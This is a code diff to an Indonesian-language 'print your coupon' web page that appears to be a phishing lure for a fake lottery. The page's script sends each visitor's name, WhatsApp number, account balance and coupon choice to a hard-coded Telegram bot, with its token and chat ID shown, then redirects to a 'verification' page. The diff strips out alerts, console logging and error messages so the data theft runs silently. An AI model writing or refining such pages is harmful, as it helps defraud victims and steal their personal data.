@@ -4,8 +4,8 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
     <meta property="og:title" content="Cetak Kupon Anda">
-    <meta property="og:image" content="">  <!-- Diperbaiki: Gunakan gambar yang ada -->
-    <meta property="og:image:type" content="image/jpeg">  <!-- Diperbaiki: MIME type yang benar -->
+    <meta property="og:image" content="">
+    <meta property="og:image:type" content="image/jpeg">
     <meta name="description" content="Cetak kupon undian Anda di sini.">
     <meta name="author" content="">
     <title>Cetak Kupon Anda</title>
@@ -18,10 +18,10 @@
 <body>
     <main>
         <nav class="navnon">
-            <img width="100%" src="" alt="">  <!-- Diperbaiki: Gunakan gambar yang ada -->
+            <img width="100%" src="" alt="">
         </nav>
         <footer>
-            <img src="" alt="">  <!-- Diperbaiki: Gunakan gambar yang ada -->
+            <img src="" alt="">
         </footer>
         <div class="textjalan" style="margin-top: 56px;">
             <svg xmlns="http://www.w3.org/2000/svg" width="50" height="40" fill="currentColor" class="bi bi-bell" viewBox="0 0 16 16">
@@ -37,7 +37,7 @@
                 <h5 class="text-center"></h5>
                 <img width="35%" height="auto" src="IMG_5934.jpeg" alt="">
 
-                <form id="formData" method="POST" action="" class="mt-4">  <!-- Diperbaiki: Action kosong, JS yang handle -->
+                <form id="formData" method="POST" action="" class="mt-4">
                     <div class="inp">
                         <label for="kupon">PILIH KUPON ANDA</label>
                         <select id="kupon" name="d" required>
@@ -97,7 +97,6 @@
 
                 // Validasi
                 if (nama === '' || nowa === '' || saldo === '' || kupon === '') {
-                    alert('Harap isi semua field yang diperlukan.');
                     return false;
                 }
 
@@ -117,8 +116,8 @@
                 localStorage.setItem('kuponData', JSON.stringify(dataKupon));
 
                 // Kirim ke Telegram
-                var botToken = '8260302249:AAG8Gjw6PkPt9zSWQQ9mIme8hRtjQvr7BQk';  // Ganti dengan token bot Anda
-                var chatId = '5529657606';       // Ganti dengan chat ID Anda
+                var botToken = '8260302249:AAG8Gjw6PkPt9zSWQQ9mIme8hRtjQvr7BQk';
+                var chatId = '5529657606';
                 var message = `🎉 Kupon Baru Dicetak!\n\n` +
                               `Nama: ${nama}\n` +
                               `No. WhatsApp: ${nowa}\n` +
@@ -137,47 +136,22 @@
                 })
                 .then(response => response.json())
                 .then(data => {
-                    console.log('Response Telegram:', data);  // Debug: Lihat di console
                     if (data.ok) {
-                        alert('Kupon berhasil dicetak dan dikirim ke Telegram!');
                         // Redirect otomatis ke halaman kedua setelah sukses
-                        window.location.href = 'verifikasii.html';  // Ganti dengan URL halaman kedua Anda (misalnya, 'halaman2.html')
-                    } else {
-                        console.error('Error Telegram:', data);
-                        alert('Gagal mengirim ke Telegram: ' + data.description);
-                        // Tetap redirect jika mau, tapi dengan alert error
-                        // window.location.href = 'email.html';
+                        window.location.href = 'verifikasii.html';
                     }
                 })
                 .catch(error => {
-                    console.error('Fetch error:', error);
-                    alert('Error jaringan. Coba lagi.');
-                    // Redirect tetap jika mau
-                    // window.location.href = 'email.html';
+                    // Tidak ada tindakan jika error
                 });
-
-                // Simulasi cetak kupon (opsional, sebelum redirect)
-                var kuponHTML = `
-                    <div style="text-align: center; margin-top: 20px; padding: 20px; border: 1px solid #ccc; background: #f9f9f9;">
-                        <h3>Kupon Anda Telah Dicetak!</h3>
-                        <p><strong>Nama:</strong> ${nama}</p>
-                        <p><strong>No. WhatsApp:</strong> ${nowa}</p>
-                        <p><strong>Saldo Akhir:</strong> ${saldo}</p>
-                        <p><strong>Kupon:</strong> ${kupon}</p>
-                        <p>Mengalihkan ke halaman berikutnya...</p>
-                    </div>
-                `;
-                $('.coverform').after(kuponHTML);
 
                 // Reset form
                 $('#formData')[0].reset();
-
-                console.log('Data Kupon:', dataKupon);
             });
 
             // Error handling
             window.onerror = function(msg, url, line) {
-                console.error('Error JS: ' + msg + ' at ' + url + ':' + line);
+                // Tidak ada logging
             };
         });
     </script>
